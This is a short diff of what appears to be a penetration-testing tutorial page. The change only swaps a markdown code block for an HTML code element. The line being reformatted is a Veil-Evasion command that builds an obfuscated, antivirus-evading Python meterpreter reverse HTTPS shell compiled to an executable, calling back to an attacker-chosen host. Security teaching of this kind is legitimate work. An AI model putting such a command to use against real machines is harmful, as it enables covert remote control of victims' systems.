@@ -32,9 +32,7 @@ image:
 
 <br><p>For the example code below we’ll make a <code>python/meterpreter/rev_https_contained</code> payload:</p>
 
-```
-python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=X.X.X.X LPORT=443 --overwrite
-```
+<p><code>python /PATH/TO/Veil-Evasion.py -p python/meterpreter/rev_https_contained -c compile_to_exe=Y use_pyherion=Y LHOST=X.X.X.X LPORT=443 --overwrite</code></p>
 
 <p>The <code>--overwrite</code> is necessary here to ensure that the new payloads replace the old ones. You will of course need to replace the X.X.X.X with your WAN IP or local IP if running it within a private network.</p>
 
